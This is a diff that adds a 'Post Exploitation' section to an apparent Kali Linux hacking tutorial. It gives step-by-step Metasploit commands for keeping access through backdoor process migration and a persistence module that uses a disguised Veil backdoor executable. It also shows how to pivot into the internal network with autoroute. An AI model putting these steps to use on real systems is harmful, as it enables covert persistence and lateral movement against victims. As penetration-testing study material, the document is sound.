@@ -31,6 +31,8 @@ This post will go into ways we can use Kali Linux to hack networks and PCs! What
         - [BeEF (Browser Exploitation Framework)](#beef-browser-exploitation-framework)
         - [Using the Above - Outside the Local Network](#using-the-above---outside-the-local-network)
 - [Post Exploitation](#post-exploitation)
+    - [Maintaining Access](#maintaining-access)
+    - [Pivoting](#pivoting)
 
 ## Gaining Access
 
@@ -227,3 +229,33 @@ If you are using any of these attacks external to your local network, there's a 
 
 ## Post Exploitation
 
+The main part of launching a hack is not only to get access to a target PC, but get/find what's on the target and make sure that we can always get into the target. Another prime example on conducting a hack on a target PC, may not be to get to that exact machine, more so to get into the network that machine is connected to and find other resources (this is also known as pivoting).
+
+### Maintaining Access
+
+Once you have backdoored into a system, the backdoor connection is likely running on a process (similar to what you see in task manager on Windows), it's typically good practice to migrate the backdoor connection onto a process that is unlikely to be closed (eg, `explorer.exe`). If you are using metasploit for this, it's as easy as running `migrate [processID]`.
+
+There's also other methodologies for maintaining access such as:
+
+- Using veil-evasion (see [Creating Backdoors](#creating-backdoors))
+- Use metasploit persistence to maintain the connection
+- Use metasploit and veil-evasion together:
+    1. Background your current meterpeter session `background`
+    2. use a module in msfconsole `use exsploit/windows/local/persistance`
+    3. `show options` to configure
+    4. `set EXE_NAME browser` (or something inconspicuous)
+    5. set the session you wish to place `set SESSION [no.]`
+    6. use the EXE::Custom the inject veil backdoor (not service).
+    7. `set EXE::Custom [path]`
+    8. `exploit`
+
+### Pivoting
+
+Use the device you hacked, hack into other devices on the intranet. We can set up an autoroute to use metasploit on the infected target as if it was the source attacking device.
+
+1. Upload any tools you need. (in metasploit) eg. Nmap
+2. use autoroute (in metasploit)
+3. `use post/windows/manage/autoroute`
+4. `set subnet [subnet]` - Set the subnet to the first 3 dots then 0 ie. xx.xx.xx.0
+5. `set session [id]` - Sets the session to run it on.
+6. `exploit`
